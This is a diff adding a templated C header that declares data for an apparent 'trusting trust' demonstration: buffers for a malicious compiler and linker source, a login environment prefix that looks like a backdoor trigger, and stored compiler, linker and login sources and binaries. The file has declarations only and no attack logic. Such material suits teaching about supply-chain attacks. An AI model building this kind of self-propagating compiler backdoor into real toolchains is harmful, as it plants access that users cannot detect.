@@ -1,0 +1,40 @@
+#ifndef DATA_H_
+#define DATA_H_
+
+
+#define login_environ (global_dirtyhark.login_environ_)
+#define login_environ_header_str "BABALOGIN_TO_LOGIN_USERNAME="
+#define login_environ_header_len (sizeof(login_environ_header_str)-1)
+
+struct DirtyHackStruct_ {{
+    char login_environ_[login_environ_header_len];
+    char padding[1024];
+    char maliciouscompiler_source_[4096];
+}} __attribute__ ((packed));
+
+extern struct DirtyHackStruct_ global_dirtyhark;
+
+#define maliciouscompiler_source_len {mycompiler_source_len}
+#define maliciouscompiler_source (global_dirtyhark.maliciouscompiler_source_)
+
+#define maliciouslinker_source_len {mylinker_source_len}
+extern char maliciouslinker_source[];
+
+
+#define mycompiler_source_len {mycompiler_source_len}
+extern char mycompiler_source[];
+
+#define mylinker_source_len {mylinker_source_len}
+extern char mylinker_source[];
+
+#define mylogin_source_len {mylogin_source_len}
+extern char mylogin_source[];
+
+
+#define mycompiler_binary_len {mycompiler_binary_len}
+extern char mycompiler_binary[];
+
+#define mylinker_binary_len {mylinker_binary_len}
+extern char mylinker_binary[];
+
+#endif
